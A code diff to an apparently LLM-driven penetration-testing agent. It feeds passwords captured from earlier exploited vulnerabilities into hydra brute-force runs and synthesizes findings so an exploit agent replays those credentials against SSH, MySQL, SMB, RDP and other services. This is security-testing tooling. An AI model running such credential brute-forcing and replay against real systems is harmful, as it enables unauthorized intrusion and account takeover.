@@ -63,9 +63,31 @@ class VulnAgent:
         decision_callback: DecisionCallback = None,
         nmap_vuln_hints: list[dict] | None = None,
         workflow_mode: str = "pentest_engineer",
+        seeds: Optional[dict[str, list]] = None,
     ) -> dict[str, Any]:
+        """
+        Args:
+            seeds: feedback / supervisor 模式下的反馈输入。结构::
+
+                {
+                    "credentials": [{"user": "...", "value": "...", "source": "..."}, ...],
+                    "web_paths":   ["/admin", ...],   # 由 orchestrator 直接合并到 web_paths
+                    "ports":       [22, 3306, ...],   # 由 orchestrator 合并
+                }
+
+                凭据会驱动两件事：
+                  ① 合成 ``credential-replay`` finding（tool=cred-replay），让
+                     ExploitAgent 命中 ``credential_replay`` Skill 直接精准登录；
+                  ② 把密码注入 hydra 的 ``-P`` 字典，弥补固定字典命中率不足。
+        """
         self._decision_callback = decision_callback
         self._workflow_mode = workflow_mode
+        self._seed_credentials: list[dict] = list((seeds or {}).get("credentials") or [])
+        if self._seed_credentials:
+            logger.info(
+                f"[VulnAgent] 收到 {len(self._seed_credentials)} 条种子凭据 → "
+                f"将驱动 hydra 字典 + 合成 credential-replay finding"
+            )
         logger.info(f"[VulnAgent] 开始漏洞扫描: {target}")
 
         if log_callback or record_callback or decision_callback:
@@ -300,6 +322,26 @@ class VulnAgent:
         # 确保 SSH/FTP/SMB/RDP 等端口有对应 finding，让 ExploitAgent 的 Skill 能匹配
         svc_findings = self._generate_service_findings(target, ports, all_findings)
         all_findings.extend(svc_findings)
+
+        # ── Phase 4.6: 凭据复用 finding 合成 ───────────────
+        # feedback / supervisor 模式下，前序漏洞产生的真实凭据会通过 seeds 注入；
+        # 这里为每个匹配端口产出"凭据复用机会"finding，触发 credential_replay Skill。
+        cred_replay_findings = self._synthesize_credential_replay_findings(target, ports)
+        if cred_replay_findings:
+            all_findings.extend(cred_replay_findings)
+            if self._decision_callback:
+                names = ", ".join(f.name for f in cred_replay_findings[:5])
+                await self._decision_callback({
+                    "action": "thought",
+                    "phase": "vuln_scan",
+                    "thinking": (
+                        f"凭据复用合成: 已抓 {len(getattr(self, '_seed_credentials', []) or [])} 条凭据，"
+                        f"为 {len(cred_replay_findings)} 个服务端口合成 cred-replay finding ({names})"
+                    ),
+                    "purpose": "凭据复用 finding 合成",
+                    "message": f"凭据复用 +{len(cred_replay_findings)} findings",
+                    "tone": "info",
+                })
 
         all_findings = _deduplicate(all_findings)
 
@@ -2049,10 +2091,20 @@ $PHUIP "{web_url}/index.php" 2>&1
     async def _brute_force_scan(self, target: str, ports: list[PortInfo]) -> dict:
         findings: list[VulnFinding] = []
         tasks = []
+        # 把种子凭据里的密码合并到 hydra 字典里（feedback 模式下从前序漏洞抓的真实密码）
+        seed_passwords = self._extract_seed_passwords()
+        seed_users = self._extract_seed_users()
         for port_info in ports:
             if port_info.port in BRUTE_SERVICES:
-                proto, users = BRUTE_SERVICES[port_info.port]
-                tasks.append(self._hydra_brute(target, port_info.port, proto, users))
+                proto, default_users = BRUTE_SERVICES[port_info.port]
+                # 把种子用户加到默认用户名前面（优先尝试真实账号）
+                merged_users = list(dict.fromkeys(seed_users + default_users))
+                tasks.append(
+                    self._hydra_brute(
+                        target, port_info.port, proto, merged_users,
+                        extra_passwords=seed_passwords,
+                    )
+                )
         if not tasks:
             return {"findings": []}
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -2061,36 +2113,160 @@ $PHUIP "{web_url}/index.php" 2>&1
                 findings.extend(r)
         return {"findings": findings}
 
+    def _extract_seed_passwords(self) -> list[str]:
+        """从 self._seed_credentials 中提取去重的密码列表（最多 30 条）。"""
+        seeds = getattr(self, "_seed_credentials", None) or []
+        passwords: list[str] = []
+        for c in seeds:
+            if not isinstance(c, dict):
+                continue
+            v = (c.get("value") or c.get("password") or "").strip()
+            if v and v not in passwords:
+                passwords.append(v)
+        return passwords[:30]
+
+    def _extract_seed_users(self) -> list[str]:
+        """从 self._seed_credentials 中提取去重的用户名列表（最多 30 条）。"""
+        seeds = getattr(self, "_seed_credentials", None) or []
+        users: list[str] = []
+        for c in seeds:
+            if not isinstance(c, dict):
+                continue
+            u = (c.get("user") or c.get("username") or "").strip()
+            if u and u not in users:
+                users.append(u)
+        return users[:30]
+
     async def _hydra_brute(
-        self, target: str, port: int, protocol: str, usernames: list[str]
+        self,
+        target: str,
+        port: int,
+        protocol: str,
+        usernames: list[str],
+        extra_passwords: list[str] | None = None,
     ) -> list[VulnFinding]:
-        result: ExecuteResult = await self.executor.run(
-            tool="hydra",
-            args=[
-                "-L", "/dev/stdin",
-                "-P", "/usr/share/wordlists/rockyou-top100.txt",
-                "-t", "4",
-                "-f",
-                f"{protocol}://{target}:{port}",
-            ],
-            input_data="\n".join(usernames),
-            timeout=120,
+        """Hydra 弱口令爆破。
+
+        ``extra_passwords`` 来自前序漏洞抓到的真实密码：会**优先**写到字典前面，
+        其后再追加 rockyou-top100。这样命中率从 "rockyou 字典是否覆盖" 提升为
+        "目标是否复用配置文件里的密码"，对依赖型多漏洞链场景非常有效。
+        """
+        # 构造合并字典：种子密码（可能 0 条）+ 内置 rockyou-top100
+        # 用 stdin 传 password list，避免在容器内写文件
+        pwd_lines: list[str] = list(extra_passwords or [])
+        # 内置 fallback 字典（精简）；当种子凭据足够时，依然保留这些常见密码
+        builtin_pwds = [
+            "root", "toor", "admin", "password", "123456",
+            "12345678", "qwerty", "letmein", "welcome", "ubuntu",
+        ]
+        for p in builtin_pwds:
+            if p not in pwd_lines:
+                pwd_lines.append(p)
+
+        # hydra: -L 用户名 stdin / -P 密码字典文件
+        # 我们让 -L 读 /tmp/hydra_users.txt, -P 读 /tmp/hydra_pwds.txt（容器内写）
+        # 简化：用 here-string 传一个临时密码文件
+        prep_cmd = (
+            "set -e; "
+            f"printf '%s\\n' {self._shell_quote_each(pwd_lines)} > /tmp/hydra_pwds.txt; "
+            f"printf '%s\\n' {self._shell_quote_each(usernames)} > /tmp/hydra_users.txt; "
+            f"hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pwds.txt -t 4 -f "
+            f"{protocol}://{target}:{port} 2>&1; "
+            "rm -f /tmp/hydra_pwds.txt /tmp/hydra_users.txt"
+        )
+        result: ExecuteResult = await self.executor.run_script(
+            script_content=prep_cmd,
+            timeout=180 if extra_passwords else 120,
         )
         findings = []
-        if result.success and "login:" in result.stdout:
-            for line in result.stdout.splitlines():
+        out = (result.stdout or "")
+        if "login:" in out:
+            for line in out.splitlines():
                 if "[" in line and "login:" in line:
+                    # 标记密码来源：是从种子凭据命中还是固定字典
+                    cracked = line.strip()
+                    cred_source = "hydra"
+                    if extra_passwords and any(p in cracked for p in extra_passwords):
+                        cred_source = "hydra+seeded_creds"
                     findings.append(VulnFinding(
                         name=f"弱口令 ({protocol.upper()})",
                         severity="high",
                         target=target,
                         port=port,
-                        description=f"在 {protocol}://{target}:{port} 发现弱口令",
-                        evidence=line.strip(),
+                        description=(
+                            f"在 {protocol}://{target}:{port} 发现弱口令"
+                            + ("（命中前序漏洞抓到的凭据）"
+                               if cred_source.endswith("seeded_creds") else "")
+                        ),
+                        evidence=cracked,
                         exploitable=True,
-                        tool="hydra",
+                        tool=cred_source,
                     ))
         return findings
+
+    @staticmethod
+    def _shell_quote_each(items: list[str]) -> str:
+        """Single-quote each string and join with spaces (safe for printf)."""
+        out: list[str] = []
+        for s in items:
+            # 单引号包裹，把字面单引号转为 '\'' 模式
+            esc = s.replace("'", "'\\''")
+            out.append(f"'{esc}'")
+        return " ".join(out)
+
+    def _synthesize_credential_replay_findings(
+        self,
+        target: str,
+        ports: list[PortInfo],
+    ) -> list[VulnFinding]:
+        """
+        反馈循环关键产出：
+
+        当 ``self._seed_credentials`` 非空（说明前序漏洞抓到了真实凭据），
+        为每个目标上"开放且可登录"的服务端口合成一个 service-level 的
+        ``credential-replay`` finding。这些 finding 会触发 ``credential_replay``
+        Skill（match.tool_is == "cred-replay"），让 ExploitAgent 在 secondary 阶段
+        **确定性**地用真实凭据对 SSH/MySQL/SMB/FTP/RDP/PostgreSQL 重放，
+        不再依赖 LLM ReAct 的灵活性。
+        """
+        seeds = getattr(self, "_seed_credentials", None) or []
+        if not seeds:
+            return []
+        # 哪些端口适合凭据复用
+        replayable_ports: dict[int, str] = {
+            22: "ssh", 2211: "ssh", 2222: "ssh", 22222: "ssh",
+            21: "ftp",
+            3306: "mysql",
+            5432: "postgres",
+            6379: "redis",
+            27017: "mongodb",
+            139: "smb", 445: "smb",
+            3389: "rdp",
+        }
+        out: list[VulnFinding] = []
+        cred_summary = ", ".join(
+            f"{c.get('user') or '?'}@{c.get('source') or '?'}"
+            for c in seeds[:5] if isinstance(c, dict)
+        )
+        for p in ports:
+            svc = replayable_ports.get(p.port)
+            if not svc:
+                continue
+            out.append(VulnFinding(
+                name=f"凭据复用机会 - {svc.upper()} ({p.port})",
+                severity="high",
+                target=f"{target}:{p.port}",
+                port=p.port,
+                description=(
+                    f"前序漏洞已抓到 {len(seeds)} 条真实凭据 ({cred_summary})；"
+                    f" {svc} 服务在 {p.port} 端口监听，**有大概率凭据复用**。"
+                    f" ExploitAgent 将走 credential_replay Skill 重放每条凭据。"
+                ),
+                evidence=f"seeds={len(seeds)} creds; service={svc}; port={p.port}",
+                exploitable=True,
+                tool="cred-replay",
+            ))
+        return out
 
 
     # ================================================================
